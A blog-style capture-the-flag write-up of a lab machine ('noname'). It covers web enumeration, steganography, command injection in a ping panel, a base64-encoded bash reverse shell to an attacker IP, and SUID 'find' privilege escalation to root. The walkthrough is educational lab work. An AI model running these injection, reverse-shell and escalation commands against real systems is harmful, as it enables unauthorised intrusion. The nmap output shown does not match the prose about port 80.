# Let's get started
## Scanning and enumeration
First thing first, we do a simple nmap scan from which we get only `port 80` open. The apache server running on this specific port seems a little outdated. It can be a good thing to check if we miss anything to attack.

```shell
‚îî‚îÄ$ nmap -T4 -sCV 192.168.222.15   
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-30 23:10 EAT
Nmap scan report for 192.168.222.15
Host is up (0.20s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE    SERVICE   VERSION

7921/tcp filtered unknown

```
Opening the port, we get a `fake admin area` panel with an input field. It seemed to be a page where the admin can taste wether the machines are up by pinging them. Not here though, its fake, it time we find the real one.

Whenever we get to a website, we are always recommended to brute force for hidden web directories in the server. We are going to use ffuf. It gives us `admin` directory.

![image](/assets/img/Posts/noname/admin.png)

Visiting the directory we find nothing but images. huh, steganograpphyyyy?? got myself wondering. well. Viewing the source code, we get to see that there are four of them with some `jpg` images among, them. EASY!!

![image](/assets/img/Posts/noname/images.png)

Downloading them and starting checking for hidden messages in them, i get something in one of the files, which looks like user names. aaargh!

![image](/assets/img/Posts/noname/user.png)

```shell
‚îå‚îÄ‚îÄ(prorat„âøprosec)-[~/hacks/offsec/noname]
‚îî‚îÄ$ cat new.jpeg.out 
admin
Admin
root
admin1
msfadmin
Admin1
```

Checking on the next one, we find a base64 string, nice. 

![image](/assets/img/Posts/noname/bas64.png)

Decoding the string from our terminal using the command `echo "base64-string" | base64 -d`, We get another directory. Impressive!.

![image](/assets/img/Posts/noname/superadmin.png)

Visiting it, we get see the legit ping panel.

![image](/assets/img/Posts/noname/super-ping.png)

Seng a simple ping scan `ping <ip>` does not bring anything, using a pipe symbol `|`to chain the commands, and typing `whoami` returns `www-data`.

![image](/assets/img/Posts/noname/rce.png)

This means that we have `code executation`. with a well crafted payload, we can get a reverse shell on the box. Sending a simple revershell on the ping platform does not connect back which made me assume that there are some filtering on the commands are ran.

## Initial access
We get our one-liner bash revershell `bash -i >& /dev/tcp/192.168.45.205/1337 0>&1` and pass it through base64 to encode it.

![image](/assets/img/Posts/noname/bencode.png)

Then echo the base64 string and pipe it to base64 and decode it, then pipe the output to means which executes it. 
```bash
ping 192.168.45.205 | echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNS8xMzM3IDA+JjEK" | base64 -d | bash
```
We get a shell as `www-data`
```shell
‚îå‚îÄ‚îÄ(prorat„âøprosec)-[~/hacks/offsec/noname]
‚îî‚îÄ$ nc -nlvp 1337                                 
listening on [any] 1337 ...
connect to [192.168.45.205] from (UNKNOWN) [192.168.222.15] 49076
bash: cannot set terminal process group (905): Inappropriate ioctl for device
bash: no job control in this shell
www-data@haclabs:/var/www/html$ 

```
## Upgrading the shell
Start by finding which python version is installed in the machine by running `which python3`. Followed by `python3 -c 'import pty;pty.spawn("/bin/bash")'` to spawn a better-featured bash shell, then `export TERM=xterm` which gives us access to term commands. Then run `CTRL + z` to background the session and `stty raw -echo; fg` which turns off our own terminal echo which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes then finally `stty rows 38 columns 116`.
We now have a stable shell.

Going to the home directory, we find two users, `haclabs` and `yash`. Accessing `yash's` directory, we find our flag. 

```shell
www-data@haclabs:/home/yash$ ls -la
total 36
drwxr-xr-x 5 yash yash 4096 Jul 10  2020 .
drwxr-xr-x 4 root root 4096 Jan 27  2020 ..
-rw------- 1 yash yash    0 Mar 16  2020 .bash_history
-rw-r--r-- 1 yash yash 3771 Jan 27  2020 .bashrc
drwx------ 2 yash yash 4096 Feb  9  2020 .cache
drwx------ 3 yash yash 4096 Jan 27  2020 .gnupg
drwxrwxr-x 3 yash yash 4096 Jan 27  2020 .local
-rw-r--r-- 1 yash yash  807 Jan 27  2020 .profile
-rw-rw-r-- 1 yash yash   77 Jan 30  2020 flag1.txt
-rw-r--r-- 1 yash yash   33 Jul  1 01:35 local.txt
www-data@haclabs:/home/yash$ cat local.txt
<redacted>
www-data@haclabs:/home/yash$ 
```
## Privilege escalation
Who is saying linpeas? Not now. First we need to some manual enumeration before we run linpeas. running a `sudo -l`, we are prompted to enter www-data password. That's a dead end, We then move on and check for any commands that have `SUID` bits set. And we get that we can run `find` as root.

![image](/assets/img/Posts/noname/suid.png)

We then check the command we can ran to abuse the permissions given to us in [GTFObins](https://gtfobins.github.io/) and get root's shell.

![image](/assets/img/Posts/noname/suid-gtfobins.png)

Running the command `find . -exec /bin/sh -p \; -quit` gives us a `#`shell.
```shell
www-data@haclabs:/tmp$ find . -exec /bin/sh -p \; -quit
# whoami
root
# cd /root
# ls
flag3.txt  proof.txt
# cat proof.txt
<redacted>
# 
```

I hope you enjoyed the write up!!. thank you üòÅ
